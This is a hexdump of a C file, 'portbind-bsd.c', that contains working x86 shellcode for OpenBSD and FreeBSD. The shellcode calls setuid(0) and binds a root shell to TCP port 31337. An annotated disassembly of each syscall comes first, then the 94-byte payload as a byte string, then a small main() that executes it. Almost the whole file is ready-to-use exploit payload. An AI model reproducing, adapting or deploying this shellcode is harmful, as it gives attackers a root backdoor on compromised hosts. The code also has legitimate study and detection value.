00000000  2f 2a 0d 0a 20 2a 20 24  49 64 3a 20 70 6f 72 74  |/*.. * $Id: port|
00000010  62 69 6e 64 2d 62 73 64  2e 63 2c 76 20 31 2e 33  |bind-bsd.c,v 1.3|
00000020  20 32 30 30 34 2f 30 36  2f 30 32 20 31 32 3a 32  | 2004/06/02 12:2|
00000030  32 3a 33 30 20 72 61 70  74 6f 72 20 45 78 70 20  |2:30 raptor Exp |
00000040  24 0d 0a 20 2a 0d 0a 20  2a 20 70 6f 72 74 62 69  |$.. *.. * portbi|
00000050  6e 64 2d 62 73 64 2e 63  20 2d 20 73 65 74 75 69  |nd-bsd.c - setui|
00000060  64 2f 70 6f 72 74 62 69  6e 64 20 73 68 65 6c 6c  |d/portbind shell|
00000070  63 6f 64 65 20 66 6f 72  20 2a 42 53 44 2f 78 38  |code for *BSD/x8|
00000080  36 0d 0a 20 2a 20 43 6f  70 79 72 69 67 68 74 20  |6.. * Copyright |
00000090  28 63 29 20 32 30 30 33  20 4d 61 72 63 6f 20 49  |(c) 2003 Marco I|
000000a0  76 61 6c 64 69 20 3c 20  72 61 70 74 6f 72 40 30  |valdi < raptor@0|
000000b0  78 64 65 61 64 62 65 65  66 2e 69 6e 66 6f 20 3e  |xdeadbeef.info >|
000000c0  0d 0a 20 2a 0d 0a 20 2a  20 53 69 6d 70 6c 65 20  |.. *.. * Simple |
000000d0  70 6f 72 74 62 69 6e 64  20 73 68 65 6c 6c 63 6f  |portbind shellco|
000000e0  64 65 20 74 68 61 74 20  62 69 6e 64 28 29 27 73  |de that bind()'s|
000000f0  20 61 20 73 65 74 75 69  64 28 30 29 20 73 68 65  | a setuid(0) she|
00000100  6c 6c 20 6f 6e 0d 0a 20  2a 20 70 6f 72 74 20 33  |ll on.. * port 3|
00000110  31 33 33 37 2f 74 63 70  20 28 62 61 73 65 64 20  |1337/tcp (based |
00000120  6f 6e 20 62 69 67 68 61  77 6b 27 73 20 63 6f 64  |on bighawk's cod|
00000130  65 29 2e 0d 0a 20 2a 0d  0a 20 2a 20 54 65 73 74  |e)... *.. * Test|
00000140  65 64 20 6f 6e 20 4f 70  65 6e 42 53 44 20 61 6e  |ed on OpenBSD an|
00000150  64 20 46 72 65 65 42 53  44 2e 0d 0a 20 2a 2f 0d  |d FreeBSD... */.|
00000160  0a 0d 0a 2f 2a 0d 0a 20  2a 20 73 65 74 75 69 64  |.../*.. * setuid|
00000170  28 30 29 0d 0a 20 2a 0d  0a 20 2a 20 32 30 63 38  |(0).. *.. * 20c8|
00000180  3a 20 20 20 20 20 20 20  33 31 20 63 30 20 20 20  |:       31 c0   |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001a0  78 6f 72 20 20 20 20 25  65 61 78 2c 25 65 61 78  |xor    %eax,%eax|
000001b0  0d 0a 20 2a 20 32 30 63  61 3a 20 20 20 20 20 20  |.. * 20ca:      |
000001c0  20 35 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 50             |
000001d0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000001e0  25 65 61 78 0d 0a 20 2a  20 32 30 63 62 3a 20 20  |%eax.. * 20cb:  |
000001f0  20 20 20 20 20 35 30 20  20 20 20 20 20 20 20 20  |     50         |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000210  68 20 20 20 25 65 61 78  0d 0a 20 2a 20 32 30 63  |h   %eax.. * 20c|
00000220  63 3a 20 20 20 20 20 20  20 62 30 20 31 37 20 20  |c:       b0 17  |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000240  20 6d 6f 76 20 20 20 20  24 30 78 31 37 2c 25 61  | mov    $0x17,%a|
00000250  6c 0d 0a 20 2a 20 32 30  63 65 3a 20 20 20 20 20  |l.. * 20ce:     |
00000260  20 20 63 64 20 38 30 20  20 20 20 20 20 20 20 20  |  cd 80         |
00000270  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |          int   |
00000280  20 24 30 78 38 30 0d 0a  20 2a 0d 0a 20 2a 20 73  | $0x80.. *.. * s|
00000290  6f 63 6b 65 74 28 41 46  5f 49 4e 45 54 2c 20 53  |ocket(AF_INET, S|
000002a0  4f 43 4b 5f 53 54 52 45  41 4d 2c 20 30 29 0d 0a  |OCK_STREAM, 0)..|
000002b0  20 2a 0d 0a 20 2a 20 32  30 64 30 3a 20 20 20 20  | *.. * 20d0:    |
000002c0  20 20 20 33 31 20 63 39  20 20 20 20 20 20 20 20  |   31 c9        |
000002d0  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 20 20  |           xor  |
000002e0  20 20 25 65 63 78 2c 25  65 63 78 0d 0a 20 2a 20  |  %ecx,%ecx.. * |
000002f0  32 30 64 32 3a 20 20 20  20 20 20 20 66 37 20 65  |20d2:       f7 e|
00000300  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
00000310  20 20 20 20 6d 75 6c 20  20 20 20 25 65 63 78 2c  |    mul    %ecx,|
00000320  25 65 61 78 0d 0a 20 2a  20 32 30 64 34 3a 20 20  |%eax.. * 20d4:  |
00000330  20 20 20 20 20 35 31 20  20 20 20 20 20 20 20 20  |     51         |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000350  68 20 20 20 25 65 63 78  0d 0a 20 2a 20 32 30 64  |h   %ecx.. * 20d|
00000360  35 3a 20 20 20 20 20 20  20 34 31 20 20 20 20 20  |5:       41     |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000380  20 69 6e 63 20 20 20 20  25 65 63 78 0d 0a 20 2a  | inc    %ecx.. *|
00000390  20 32 30 64 36 3a 20 20  20 20 20 20 20 35 31 20  | 20d6:       51 |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  20 20 20 20 20 70 75 73  68 20 20 20 25 65 63 78  |     push   %ecx|
000003c0  0d 0a 20 2a 20 32 30 64  37 3a 20 20 20 20 20 20  |.. * 20d7:      |
000003d0  20 34 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 41             |
000003e0  20 20 20 20 20 20 20 20  20 69 6e 63 20 20 20 20  |         inc    |
000003f0  25 65 63 78 0d 0a 20 2a  20 32 30 64 38 3a 20 20  |%ecx.. * 20d8:  |
00000400  20 20 20 20 20 35 31 20  20 20 20 20 20 20 20 20  |     51         |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000420  68 20 20 20 25 65 63 78  0d 0a 20 2a 20 32 30 64  |h   %ecx.. * 20d|
00000430  39 3a 20 20 20 20 20 20  20 35 31 20 20 20 20 20  |9:       51     |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 70 75 73 68 20 20 20  25 65 63 78 0d 0a 20 2a  | push   %ecx.. *|
00000460  20 32 30 64 61 3a 20 20  20 20 20 20 20 62 30 20  | 20da:       b0 |
00000470  36 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |61              |
00000480  20 20 20 20 20 6d 6f 76  20 20 20 20 24 30 78 36  |     mov    $0x6|
00000490  31 2c 25 61 6c 0d 0a 20  2a 20 32 30 64 63 3a 20  |1,%al.. * 20dc: |
000004a0  20 20 20 20 20 20 63 64  20 38 30 20 20 20 20 20  |      cd 80     |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
000004c0  74 20 20 20 20 24 30 78  38 30 0d 0a 20 2a 0d 0a  |t    $0x80.. *..|
000004d0  20 2a 20 62 69 6e 64 28  73 2c 20 73 65 72 76 65  | * bind(s, serve|
000004e0  72 2c 20 73 69 7a 65 6f  66 28 73 65 72 76 65 72  |r, sizeof(server|
000004f0  29 29 0d 0a 20 2a 0d 0a  20 2a 20 32 30 64 65 3a  |)).. *.. * 20de:|
00000500  20 20 20 20 20 20 20 38  39 20 63 33 20 20 20 20  |       89 c3    |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000520  6f 76 20 20 20 20 25 65  61 78 2c 25 65 62 78 0d  |ov    %eax,%ebx.|
00000530  0a 20 2a 20 32 30 65 30  3a 20 20 20 20 20 20 20  |. * 20e0:       |
00000540  35 32 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |52              |
00000550  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 25  |        push   %|
00000560  65 64 78 0d 0a 20 2a 20  32 30 65 31 3a 20 20 20  |edx.. * 20e1:   |
00000570  20 20 20 20 36 36 20 36  38 20 37 61 20 36 39 20  |    66 68 7a 69 |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000590  77 20 20 24 30 78 36 39  37 61 0d 0a 20 2a 20 32  |w  $0x697a.. * 2|
000005a0  30 65 35 3a 20 20 20 20  20 20 20 36 36 20 35 31  |0e5:       66 51|
000005b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005c0  20 20 20 70 75 73 68 20  20 20 25 63 78 0d 0a 20  |   push   %cx.. |
000005d0  2a 20 32 30 65 37 3a 20  20 20 20 20 20 20 38 39  |* 20e7:       89|
000005e0  20 65 36 20 20 20 20 20  20 20 20 20 20 20 20 20  | e6             |
000005f0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 25 65 73  |      mov    %es|
00000600  70 2c 25 65 73 69 0d 0a  20 2a 20 32 30 65 39 3a  |p,%esi.. * 20e9:|
00000610  20 20 20 20 20 20 20 62  31 20 31 30 20 20 20 20  |       b1 10    |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000630  6f 76 20 20 20 20 24 30  78 31 30 2c 25 63 6c 0d  |ov    $0x10,%cl.|
00000640  0a 20 2a 20 32 30 65 62  3a 20 20 20 20 20 20 20  |. * 20eb:       |
00000650  35 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |51              |
00000660  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 25  |        push   %|
00000670  65 63 78 0d 0a 20 2a 20  32 30 65 63 3a 20 20 20  |ecx.. * 20ec:   |
00000680  20 20 20 20 35 36 20 20  20 20 20 20 20 20 20 20  |    56          |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000006a0  20 20 20 25 65 73 69 0d  0a 20 2a 20 32 30 65 64  |   %esi.. * 20ed|
000006b0  3a 20 20 20 20 20 20 20  35 30 20 20 20 20 20 20  |:       50      |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006d0  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 2a 20  |push   %eax.. * |
000006e0  32 30 65 65 3a 20 20 20  20 20 20 20 35 30 20 20  |20ee:       50  |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000700  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
00000710  0a 20 2a 20 32 30 65 66  3a 20 20 20 20 20 20 20  |. * 20ef:       |
00000720  62 30 20 36 38 20 20 20  20 20 20 20 20 20 20 20  |b0 68           |
00000730  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000740  30 78 36 38 2c 25 61 6c  0d 0a 20 2a 20 32 30 66  |0x68,%al.. * 20f|
00000750  31 3a 20 20 20 20 20 20  20 63 64 20 38 30 20 20  |1:       cd 80  |
00000760  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000770  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  | int    $0x80.. |
00000780  2a 0d 0a 20 2a 20 6c 69  73 74 65 6e 28 73 2c 20  |*.. * listen(s, |
00000790  31 29 0d 0a 20 2a 0d 0a  20 2a 20 32 30 66 33 3a  |1).. *.. * 20f3:|
000007a0  20 20 20 20 20 20 20 35  31 20 20 20 20 20 20 20  |       51       |
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000007c0  75 73 68 20 20 20 25 65  63 78 0d 0a 20 2a 20 32  |ush   %ecx.. * 2|
000007d0  30 66 34 3a 20 20 20 20  20 20 20 35 33 20 20 20  |0f4:       53   |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007f0  20 20 20 70 75 73 68 20  20 20 25 65 62 78 0d 0a  |   push   %ebx..|
00000800  20 2a 20 32 30 66 35 3a  20 20 20 20 20 20 20 35  | * 20f5:       5|
00000810  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
00000820  20 20 20 20 20 20 20 70  75 73 68 20 20 20 25 65  |       push   %e|
00000830  62 78 0d 0a 20 2a 20 32  30 66 36 3a 20 20 20 20  |bx.. * 20f6:    |
00000840  20 20 20 62 30 20 36 61  20 20 20 20 20 20 20 20  |   b0 6a        |
00000850  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000860  20 20 24 30 78 36 61 2c  25 61 6c 0d 0a 20 2a 20  |  $0x6a,%al.. * |
00000870  32 30 66 38 3a 20 20 20  20 20 20 20 63 64 20 38  |20f8:       cd 8|
00000880  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
00000890  20 20 20 20 69 6e 74 20  20 20 20 24 30 78 38 30  |    int    $0x80|
000008a0  0d 0a 20 2a 0d 0a 20 2a  20 61 63 63 65 70 74 28  |.. *.. * accept(|
000008b0  73 2c 20 30 2c 20 30 29  0d 0a 20 2a 0d 0a 20 2a  |s, 0, 0).. *.. *|
000008c0  20 32 30 66 61 3a 20 20  20 20 20 20 20 35 32 20  | 20fa:       52 |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008e0  20 20 20 20 20 70 75 73  68 20 20 20 25 65 64 78  |     push   %edx|
000008f0  0d 0a 20 2a 20 32 30 66  62 3a 20 20 20 20 20 20  |.. * 20fb:      |
00000900  20 35 32 20 20 20 20 20  20 20 20 20 20 20 20 20  | 52             |
00000910  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000920  25 65 64 78 0d 0a 20 2a  20 32 30 66 63 3a 20 20  |%edx.. * 20fc:  |
00000930  20 20 20 20 20 35 33 20  20 20 20 20 20 20 20 20  |     53         |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000950  68 20 20 20 25 65 62 78  0d 0a 20 2a 20 32 30 66  |h   %ebx.. * 20f|
00000960  64 3a 20 20 20 20 20 20  20 35 33 20 20 20 20 20  |d:       53     |
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000980  20 70 75 73 68 20 20 20  25 65 62 78 0d 0a 20 2a  | push   %ebx.. *|
00000990  20 32 30 66 65 3a 20 20  20 20 20 20 20 62 30 20  | 20fe:       b0 |
000009a0  31 65 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1e              |
000009b0  20 20 20 20 20 6d 6f 76  20 20 20 20 24 30 78 31  |     mov    $0x1|
000009c0  65 2c 25 61 6c 0d 0a 20  2a 20 32 31 30 30 3a 20  |e,%al.. * 2100: |
000009d0  20 20 20 20 20 20 63 64  20 38 30 20 20 20 20 20  |      cd 80     |
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
000009f0  74 20 20 20 20 24 30 78  38 30 0d 0a 20 2a 0d 0a  |t    $0x80.. *..|
00000a00  20 2a 20 64 75 70 32 28  63 2c 20 32 29 0d 0a 20  | * dup2(c, 2).. |
00000a10  2a 20 64 75 70 32 28 63  2c 20 31 29 0d 0a 20 2a  |* dup2(c, 1).. *|
00000a20  20 64 75 70 32 28 63 2c  20 30 29 0d 0a 20 2a 0d  | dup2(c, 0).. *.|
00000a30  0a 20 2a 20 32 31 30 32  3a 20 20 20 20 20 20 20  |. * 2102:       |
00000a40  62 31 20 30 33 20 20 20  20 20 20 20 20 20 20 20  |b1 03           |
00000a50  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000a60  30 78 33 2c 25 63 6c 0d  0a 20 2a 20 32 31 30 34  |0x3,%cl.. * 2104|
00000a70  3a 20 20 20 20 20 20 20  38 39 20 63 33 20 20 20  |:       89 c3   |
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a90  6d 6f 76 20 20 20 20 25  65 61 78 2c 25 65 62 78  |mov    %eax,%ebx|
00000aa0  0d 0a 20 2a 20 32 31 30  36 3a 20 20 20 20 20 20  |.. * 2106:      |
00000ab0  20 62 30 20 35 61 20 20  20 20 20 20 20 20 20 20  | b0 5a          |
00000ac0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000ad0  24 30 78 35 61 2c 25 61  6c 0d 0a 20 2a 20 32 31  |$0x5a,%al.. * 21|
00000ae0  30 38 3a 20 20 20 20 20  20 20 34 39 20 20 20 20  |08:       49    |
00000af0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b00  20 20 64 65 63 20 20 20  20 25 65 63 78 0d 0a 20  |  dec    %ecx.. |
00000b10  2a 20 32 31 30 39 3a 20  20 20 20 20 20 20 35 31  |* 2109:       51|
00000b20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b30  20 20 20 20 20 20 70 75  73 68 20 20 20 25 65 63  |      push   %ec|
00000b40  78 0d 0a 20 2a 20 32 31  30 61 3a 20 20 20 20 20  |x.. * 210a:     |
00000b50  20 20 35 33 20 20 20 20  20 20 20 20 20 20 20 20  |  53            |
00000b60  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000b70  20 25 65 62 78 0d 0a 20  2a 20 32 31 30 62 3a 20  | %ebx.. * 210b: |
00000b80  20 20 20 20 20 20 35 33  20 20 20 20 20 20 20 20  |      53        |
00000b90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000ba0  73 68 20 20 20 25 65 62  78 0d 0a 20 2a 20 32 31  |sh   %ebx.. * 21|
00000bb0  30 63 3a 20 20 20 20 20  20 20 63 64 20 38 30 20  |0c:       cd 80 |
00000bc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bd0  20 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |  int    $0x80..|
00000be0  20 2a 20 32 31 30 65 3a  20 20 20 20 20 20 20 34  | * 210e:       4|
00000bf0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
00000c00  20 20 20 20 20 20 20 69  6e 63 20 20 20 20 25 65  |       inc    %e|
00000c10  63 78 0d 0a 20 2a 20 32  31 30 66 3a 20 20 20 20  |cx.. * 210f:    |
00000c20  20 20 20 65 32 20 66 35  20 20 20 20 20 20 20 20  |   e2 f5        |
00000c30  20 20 20 20 20 20 20 20  20 20 20 6c 6f 6f 70 20  |           loop |
00000c40  20 20 32 31 30 36 20 3c  5f 73 63 2b 30 78 33 65  |  2106 <_sc+0x3e|
00000c50  3e 0d 0a 20 2a 0d 0a 20  2a 20 65 78 65 63 76 65  |>.. *.. * execve|
00000c60  28 22 2f 62 69 6e 2f 73  68 22 2c 20 5b 22 2f 62  |("/bin/sh", ["/b|
00000c70  69 6e 2f 73 68 22 5d 2c  20 4e 55 4c 4c 29 0d 0a  |in/sh"], NULL)..|
00000c80  20 2a 0d 0a 20 2a 20 32  31 31 31 3a 20 20 20 20  | *.. * 2111:    |
00000c90  20 20 20 35 31 20 20 20  20 20 20 20 20 20 20 20  |   51           |
00000ca0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000cb0  20 20 25 65 63 78 0d 0a  20 2a 20 32 31 31 32 3a  |  %ecx.. * 2112:|
00000cc0  20 20 20 20 20 20 20 36  38 20 32 66 20 32 66 20  |       68 2f 2f |
00000cd0  37 33 20 36 38 20 20 20  20 20 20 20 20 20 20 70  |73 68          p|
00000ce0  75 73 68 20 20 20 24 30  78 36 38 37 33 32 66 32  |ush   $0x68732f2|
00000cf0  66 0d 0a 20 2a 20 32 31  31 37 3a 20 20 20 20 20  |f.. * 2117:     |
00000d00  20 20 36 38 20 32 66 20  36 32 20 36 39 20 36 65  |  68 2f 62 69 6e|
00000d10  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000d20  20 24 30 78 36 65 36 39  36 32 32 66 0d 0a 20 2a  | $0x6e69622f.. *|
00000d30  20 32 31 31 63 3a 20 20  20 20 20 20 20 38 39 20  | 211c:       89 |
00000d40  65 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3              |
00000d50  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 73 70  |     mov    %esp|
00000d60  2c 25 65 62 78 0d 0a 20  2a 20 32 31 31 65 3a 20  |,%ebx.. * 211e: |
00000d70  20 20 20 20 20 20 35 31  20 20 20 20 20 20 20 20  |      51        |
00000d80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000d90  73 68 20 20 20 25 65 63  78 0d 0a 20 2a 20 32 31  |sh   %ecx.. * 21|
00000da0  31 66 3a 20 20 20 20 20  20 20 35 34 20 20 20 20  |1f:       54    |
00000db0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dc0  20 20 70 75 73 68 20 20  20 25 65 73 70 0d 0a 20  |  push   %esp.. |
00000dd0  2a 20 32 31 32 30 3a 20  20 20 20 20 20 20 35 33  |* 2120:       53|
00000de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000df0  20 20 20 20 20 20 70 75  73 68 20 20 20 25 65 62  |      push   %eb|
00000e00  78 0d 0a 20 2a 20 32 31  32 31 3a 20 20 20 20 20  |x.. * 2121:     |
00000e10  20 20 35 33 20 20 20 20  20 20 20 20 20 20 20 20  |  53            |
00000e20  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000e30  20 25 65 62 78 0d 0a 20  2a 20 32 31 32 32 3a 20  | %ebx.. * 2122: |
00000e40  20 20 20 20 20 20 62 30  20 33 62 20 20 20 20 20  |      b0 3b     |
00000e50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000e60  76 20 20 20 20 24 30 78  33 62 2c 25 61 6c 0d 0a  |v    $0x3b,%al..|
00000e70  20 2a 20 32 31 32 34 3a  20 20 20 20 20 20 20 63  | * 2124:       c|
00000e80  64 20 38 30 20 20 20 20  20 20 20 20 20 20 20 20  |d 80            |
00000e90  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 24 30  |       int    $0|
00000ea0  78 38 30 0d 0a 20 2a 2f  0d 0a 0d 0a 63 68 61 72  |x80.. */....char|
00000eb0  20 73 63 5b 5d 20 3d 20  2f 2a 20 38 20 2b 20 38  | sc[] = /* 8 + 8|
00000ec0  36 20 3d 20 39 34 20 62  79 74 65 73 20 2a 2f 0d  |6 = 94 bytes */.|
00000ed0  0a 22 5c 78 33 31 5c 78  63 30 5c 78 35 30 5c 78  |."\x31\xc0\x50\x|
00000ee0  35 30 5c 78 62 30 5c 78  31 37 5c 78 63 64 5c 78  |50\xb0\x17\xcd\x|
00000ef0  38 30 22 0d 0a 22 5c 78  33 31 5c 78 63 39 5c 78  |80".."\x31\xc9\x|
00000f00  66 37 5c 78 65 31 5c 78  35 31 5c 78 34 31 5c 78  |f7\xe1\x51\x41\x|
00000f10  35 31 5c 78 34 31 5c 78  35 31 5c 78 35 31 5c 78  |51\x41\x51\x51\x|
00000f20  62 30 5c 78 36 31 5c 78  63 64 5c 78 38 30 22 0d  |b0\x61\xcd\x80".|
00000f30  0a 22 5c 78 38 39 5c 78  63 33 5c 78 35 32 5c 78  |."\x89\xc3\x52\x|
00000f40  36 36 5c 78 36 38 22 0d  0a 22 5c 78 37 61 5c 78  |66\x68".."\x7a\x|
00000f50  36 39 22 20 2f 2f 20 70  6f 72 74 20 33 31 33 33  |69" // port 3133|
00000f60  37 2f 74 63 70 2c 20 63  68 61 6e 67 65 20 69 66  |7/tcp, change if|
00000f70  20 6e 65 65 64 65 64 0d  0a 22 5c 78 36 36 5c 78  | needed.."\x66\x|
00000f80  35 31 5c 78 38 39 5c 78  65 36 5c 78 62 31 5c 78  |51\x89\xe6\xb1\x|
00000f90  31 30 5c 78 35 31 5c 78  35 36 5c 78 35 30 5c 78  |10\x51\x56\x50\x|
00000fa0  35 30 5c 78 62 30 5c 78  36 38 5c 78 63 64 5c 78  |50\xb0\x68\xcd\x|
00000fb0  38 30 22 0d 0a 22 5c 78  35 31 5c 78 35 33 5c 78  |80".."\x51\x53\x|
00000fc0  35 33 5c 78 62 30 5c 78  36 61 5c 78 63 64 5c 78  |53\xb0\x6a\xcd\x|
00000fd0  38 30 22 0d 0a 22 5c 78  35 32 5c 78 35 32 5c 78  |80".."\x52\x52\x|
00000fe0  35 33 5c 78 35 33 5c 78  62 30 5c 78 31 65 5c 78  |53\x53\xb0\x1e\x|
00000ff0  63 64 5c 78 38 30 22 0d  0a 22 5c 78 62 31 5c 78  |cd\x80".."\xb1\x|
00001000  30 33 5c 78 38 39 5c 78  63 33 5c 78 62 30 5c 78  |03\x89\xc3\xb0\x|
00001010  35 61 5c 78 34 39 5c 78  35 31 5c 78 35 33 5c 78  |5a\x49\x51\x53\x|
00001020  35 33 5c 78 63 64 5c 78  38 30 22 0d 0a 22 5c 78  |53\xcd\x80".."\x|
00001030  34 31 5c 78 65 32 5c 78  66 35 5c 78 35 31 5c 78  |41\xe2\xf5\x51\x|
00001040  36 38 2f 2f 73 68 5c 78  36 38 2f 62 69 6e 5c 78  |68//sh\x68/bin\x|
00001050  38 39 5c 78 65 33 5c 78  35 31 5c 78 35 34 5c 78  |89\xe3\x51\x54\x|
00001060  35 33 5c 78 35 33 5c 78  62 30 5c 78 33 62 5c 78  |53\x53\xb0\x3b\x|
00001070  63 64 5c 78 38 30 22 3b  0d 0a 0d 0a 6d 61 69 6e  |cd\x80";....main|
00001080  28 29 0d 0a 7b 0d 0a 09  69 6e 74 20 28 2a 66 29  |()..{...int (*f)|
00001090  28 29 20 3d 20 28 69 6e  74 20 28 2a 29 28 29 29  |() = (int (*)())|
000010a0  73 63 3b 20 66 28 29 3b  0d 0a 7d                 |sc; f();..}|
000010ab
